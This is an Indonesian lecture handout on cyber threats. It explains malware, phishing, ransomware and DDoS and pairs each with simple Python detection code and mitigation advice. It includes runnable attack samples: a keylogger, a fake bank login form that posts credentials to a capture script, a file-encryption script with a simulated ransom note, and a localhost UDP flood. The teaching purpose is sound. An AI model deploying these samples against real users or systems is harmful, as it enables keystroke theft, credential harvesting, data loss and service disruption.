# Handout Kuliah: Ancaman dan Serangan Siber


## 1. Pengantar 

### Tujuan Pembelajaran
1. Memahami berbagai jenis ancaman siber yang umum terjadi
2. Menjelaskan cara kerja malware, phishing, ransomware, dan DDoS
3. Memahami contoh implementasi sederhana untuk memahami konsep serangan
4. Mampu menerapkan langkah mitigasi dasar

### Konsep Dasar
- Ancaman siber: Aktivitas berbahaya yang menargetkan sistem, data, atau jaringan
- Serangan siber: Dapat dilakukan secara otomatis (script, malware) atau manual (social engineering)

---

## 2. Malware

### a. Definisi
- *Malicious Software* - perangkat lunak berbahaya yang merusak atau mengambil alih sistem
- Jenis-jenis malware:
  - Virus - menyebar dengan menempel pada file
  - Worm - menyebar otomatis melalui jaringan
  - Trojan - menyamar sebagai aplikasi sah
  - Spyware/Keylogger - mencuri data pengguna

### b. Cara Kerja
- Masuk melalui file, email, USB, atau unduhan
- Mengeksekusi kode berbahaya di sistem target

### c. Contoh Kode (Python Keylogger Sederhana - EDUKASI)
```python
from pynput import keyboard
import logging

# Setup logging
logging.basicConfig(
    filename="keylog.txt", 
    level=logging.DEBUG, 
    format="%(asctime)s - %(message)s"
)

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error: {str(e)}")

# Deteksi dan blok jika dijalankan di lingkungan produksi
import os
if os.environ.get('PRODUCTION'):
    print("Akses ditolak - lingkungan produksi")
    exit()

# Hanya jalankan dalam lingkungan terkontrol
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger edukasi berjalan (tekan ESC untuk berhenti)")
    listener.join()
```

### d. Deteksi & Pencegahan Malware
```python
import psutil
import hashlib
import os
from datetime import datetime

class MalwareDetector:
    def __init__(self):
        self.suspicious_processes = ["cryptolocker", "wannacry", "keylogger"]
        self.known_malware_hashes = [
            "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",  # Contoh hash malware
        ]
    
    def scan_processes(self):
        """Memindai proses yang mencurigakan"""
        suspicious_found = []
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                if any(suspicious in proc.info['name'].lower() 
                       for suspicious in self.suspicious_processes):
                    suspicious_found.append(proc.info)
            except:
                continue
        return suspicious_found
    
    def check_file_integrity(self, file_path):
        """Memeriksa integritas file dengan hashing"""
        if not os.path.exists(file_path):
            return False
        
        with open(file_path, 'rb') as f:
            file_hash = hashlib.sha1(f.read()).hexdigest()
        
        return file_hash in self.known_malware_hashes

# Contoh penggunaan
detector = MalwareDetector()
suspicious = detector.scan_processes()
if suspicious:
    print(f"Proses mencurigakan ditemukan: {suspicious}")
```

### e. Mitigasi
- Gunakan antivirus/antimalware
- Patch sistem secara berkala
- Jangan mengunduh file dari sumber tidak terpercaya
- Gunakan prinsip least privilege

---

## 3. Phishing

### a. Definisi
- Teknik manipulasi psikologis (*social engineering*) untuk mencuri informasi sensitif

### b. Cara Kerja
- Email, SMS, atau situs palsu yang mirip aslinya
- Korban diminta memasukkan data sensitif

### c. Contoh Kode (HTML Form Phishing - DEMO LOKAL)
```html
<!DOCTYPE html>
<html>
<head>
    <title>Login - Bank Contoh</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; }
        .warning { color: red; font-weight: bold; border: 2px solid red; padding: 10px; }
    </style>
</head>
<body>
    <div class="warning">PERINGATAN: Ini adalah simulasi phishing untuk edukasi. Jangan gunakan data nyata!</div>
    
    <h2>Login Bank Contoh</h2>
    <form method="POST" action="capture.php">
        <label>Username:</label><br>
        <input type="text" name="username"><br>
        <label>Password:</label><br>
        <input type="password" name="password"><br><br>
        <button type="submit">Login</button>
    </form>
    
    <p style="margin-top: 30px; font-size: 12px; color: #666;">
        Cara mengenali phishing:
        <ul style="font-size: 12px;">
            <li>Periksa URL address bar</li>
            <li>Cari tanda gembok (HTTPS)</li>
            <li>Hati-hati dengan permintaan informasi sensitif</li>
        </ul>
    </p>
</body>
</html>
```

### d. Deteksi Phishing dengan Python
```python
import re
import requests
from urllib.parse import urlparse

class PhishingDetector:
    def __init__(self):
        self.suspicious_keywords = [
            'verify', 'secure', 'account', 'login', 'bank', 
            'update', 'security', 'urgent', 'password'
        ]
    
    def analyze_url(self, url):
        """Menganalisis URL untuk indikasi phishing"""
        indicators = []
        
        # Cek penggunaan IP address
        if re.match(r'\d+\.\d+\.\d+\.\d+', urlparse(url).netloc):
            indicators.append("Menggunakan IP address langsung")
        
        # Cek panjang domain
        if len(url) > 75:
            indicators.append("URL sangat panjang (bisa jadi penyamaran)")
        
        # Cek keyword mencurigakan
        for keyword in self.suspicious_keywords:
            if keyword in url.lower():
                indicators.append(f"Mengandung kata '{keyword}'")
        
        # Cek penggunaan karakter khusus
        if '@' in url or '-' in urlparse(url).netloc:
            indicators.append("Menggunakan karakter tidak biasa")
        
        return indicators

# Contoh penggunaan
detector = PhishingDetector()
test_url = "http://bank-example-security-verify.com/login"
results = detector.analyze_url(test_url)

if results:
    print("Indikasi phishing ditemukan:")
    for indicator in results:
        print(f"- {indicator}")
```

### e. Mitigasi
- Periksa URL dengan cermat
- Aktifkan two-factor authentication (2FA)
- Edukasi pengguna tentang phishing
- Gunakan email filtering

---

## 4. Ransomware

### a. Definisi
- Malware yang mengenkripsi data korban dan meminta tebusan

### b. Cara Kerja
- Menyebar lewat email atau exploit
- File korban di-encrypt, lalu muncul pesan "bayar untuk decrypt"

### c. Contoh Kode (Python Enkripsi File - EDUKASI)
```python
from cryptography.fernet import Fernet
import os

# Peringatan keamanan
print("PERINGATAN: Ini hanya untuk tujuan edukasi!")
print("Jangan jalankan kode ini pada file penting atau sistem produksi!")

# Generate key
key = Fernet.generate_key()
cipher = Fernet(key)

# Simpan kunci untuk dekripsi (dalam dunia nyata, penyerang tidak akan memberikan ini)
with open("key.key", "wb") as key_file:
    key_file.write(key)

# Enkripsi file contoh
file_to_encrypt = "contoh_file.txt"

# Buat file contoh jika belum ada
if not os.path.exists(file_to_encrypt):
    with open(file_to_encrypt, "w") as f:
        f.write("Ini adalah file contoh untuk simulasi ransomware edukasi.")

# Enkripsi file
with open(file_to_encrypt, "rb") as f:
    data = f.read()

encrypted = cipher.encrypt(data)

with open(file_to_encrypt + ".encrypted", "wb") as f:
    f.write(encrypted)

# Hapus file asli (simulasi)
os.remove(file_to_encrypt)

print("File terenkripsi! Kunci disimpan di key.key")
print("Pesan tebusan simulasi: File Anda telah dienkripsi. Kirim 0.1 BTC ke alamat XYZ.")
```

### d. Tools Pencegahan Ransomware
```python
import os
import hashlib
from pathlib import Path

class RansomwareProtector:
    def __init__(self, protected_dirs=None):
        self.protected_dirs = protected_dirs or [os.path.expanduser("~/Documents")]
        self.backup_dir = os.path.expanduser("~/Backups")
        os.makedirs(self.backup_dir, exist_ok=True)
    
    def create_backup(self):
        """Membuat backup file penting"""
        for protected_dir in self.protected_dirs:
            if os.path.exists(protected_dir):
                for file_path in Path(protected_dir).rglob('*'):
                    if file_path.is_file():
                        # Simulasikan backup sederhana
                        backup_path = os.path.join(
                            self.backup_dir, 
                            f"backup_{file_path.name}"
                        )
                        # Dalam implementasi nyata, gunakan library backup proper
                        print(f"Backup created for: {file_path.name}")
    
    def monitor_files(self):
        """Memantau perubahan file mencurigakan (enkripsi massal)"""
        # Dalam implementasi nyata, ini akan menggunakan filesystem monitoring
        print("Monitoring files for suspicious activity...")
    
    def restore_backup(self):
        """Memulihkan dari backup"""
        print("Restoring files from backup...")

# Contoh penggunaan
protector = RansomwareProtector()
protector.create_backup()
```

### e. Mitigasi
- Backup data secara teratur (3-2-1 rule)
- Update sistem operasi dan aplikasi
- Jangan klik lampiran mencurigakan
- Gunakan security software

---

## 5. DDoS (Distributed Denial of Service)

### a. Definisi
- Serangan membanjiri server dengan traffic berlebih agar down

### b. Cara Kerja
- Ribuan request palsu ke server dalam waktu singkat
- Biasanya menggunakan botnet

### c. Contoh Kode (Python Flooding - EDUKASI)
```python
import socket
import time
import threading

# PERINGATAN: Hanya untuk edukasi dan testing di lingkungan terkontrol
print("SIMULASI DOS - HANYA UNTUK EDUKASI")
print("Jangan gunakan untuk menyerang sistem lain!")

target = "127.0.0.1"  # Hanya localhost
port = 8080
duration = 10  # Durasi simulasi (detik)

def dos_attack():
    """Simulasi serangan DoS sederhana"""
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Buat socket baru untuk setiap packet (tidak efisien, tapi untuk demo)
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(b"X", (target, port))
                packet_count += 1
            
            time.sleep(0.01)  # Delay kecil untuk tidak membebani sistem
            
    except Exception as e:
        print(f"Error: {e}")
    
    print(f"{packet_count} paket dikirim ke {target}:{port}")

# Jalankan simulasi
dos_attack()
```

### d. Deteksi & Mitigasi DDoS
```python
import time
from collections import defaultdict

class DDoSDetector:
    def __init__(self, threshold=100):
        self.request_log = defaultdict(list)
        self.threshold = threshold  # Request per detik
    
    def log_request(self, ip_address):
        """Mencatat request untuk analisis"""
        current_time = time.time()
        self.request_log[ip_address].append(current_time)
        
        # Bersihkan log yang sudah lama
        self.clean_old_entries(ip_address, current_time)
        
        # Deteksi serangan
        if self.detect_attack(ip_address):
            print(f"⚠️  DDoS terdeteksi dari IP: {ip_address}")
            return True
        return False
    
    def clean_old_entries(self, ip_address, current_time, window=10):
        """Menghapus entri yang sudah lewat dari window waktu"""
        self.request_log[ip_address] = [
            t for t in self.request_log[ip_address] 
            if current_time - t < window
        ]
    
    def detect_attack(self, ip_address):
        """Mendeteksi apakah IP melakukan serangan"""
        requests_in_window = len(self.request_log[ip_address])
        return requests_in_window > self.threshold

# Simulasi
detector = DDoSDetector(threshold=5)  # Threshold rendah untuk demo

# Simulasi request normal
for _ in range(10):
    detector.log_request("192.168.1.100")
    time.sleep(0.2)

# Simulasi request DDoS
for _ in range(20):
    detector.log_request("192.168.1.999")  # IP penyerang
    time.sleep(0.05)
```

### e. Mitigasi
- Gunakan firewall dan rate limiting
- Implementasi CDN (Cloudflare, AWS Shield)
- Scale resources secara horizontal
- Monitor traffic patterns

---

## 6. Studi Kasus

### a. WannaCry Ransomware (2017)
- Serangan global, menyerang rumah sakit, bank, instansi pemerintah
- Mengeksploitasi vulnerability Windows SMBv1
- Kerugian mencapai miliaran dolar

### b. Phishing Bank di Indonesia
- Banyak korban melalui SMS/WhatsApp palsu
- Modus mengatasnamakan bank untuk mendapatkan OTP
- Kerugian finansial yang signifikan

### c. DDoS GitHub (2018)
- Salah satu serangan DDoS terbesar dengan 1.3 Tbps traffic
- Memanfaatkan memcached servers yang terekspos
- Berhasil dimitigasi dalam waktu 10 menit

---

## 7. Ringkasan & Diskusi

- Malware, phishing, ransomware, dan DDoS adalah ancaman nyata di dunia siber
- Mitigasi memerlukan pendekatan teknis (tools, software, patching) dan non-teknis (edukasi pengguna)
- Demonstrasi kode membantu memahami konsep, tetapi hanya untuk tujuan edukasi
- Keamanan siber adalah tanggung jawab bersama

---

## 8. Latihan / Tugas

1. Identifikasi Email Phishing
   - Analisis contoh email dan identifikasi elemen phishing
   - Presentasikan temuan di kelas

2. Simulasi Form Login
   - Buat simulasi form login palsu di localhost
   - Bandingkan dengan form login asli dan identifikasi perbedaannya

3. Simulasi Enkripsi File
   - Implementasikan skrip enkripsi/dekripsi sederhana dengan Python
   - Dokumentasikan proses dan pelajaran yang didapat

4. Rencana Mitigasi DDoS
   - Buat proposal mitigasi DDoS untuk website kecil
   - Pertimbangkan aspek teknis dan biaya

5. Analisis Kasus Nyata
   - Pilih satu kasus serangan siber nyata
   - Analisis vektor serangan, dampak, dan langkah mitigasinya

---

## 9. Sumber Belajar

1. Buku:
   - "Cybersecurity Essentials" by Charles J. Brooks
   - "The Web Application Hacker's Handbook" by Dafydd Stuttard

2. Online Resources:
   - OWASP Top 10 Web Application Security Risks
   - SANS Institute Security Awareness
   - CISA Cybersecurity Alerts

3. Tools Praktik:
   - VirtualBox/VMware untuk lingkungan terisolasi
   - Kali Linux untuk tools keamanan
   - Docker untuk containerized applications

---

Disclaimer: Semua kode dalam handout ini hanya untuk tujuan edukasi dan tidak boleh digunakan untuk aktivitas ilegal atau berbahaya. Selalu patuhi hukum yang berlaku dan dapatkan izin sebelum melakukan testing pada sistem mana pun.

Dosen: Jehan Afwazi Ahmad
Kontak: [jehan.labs@gmail.com]  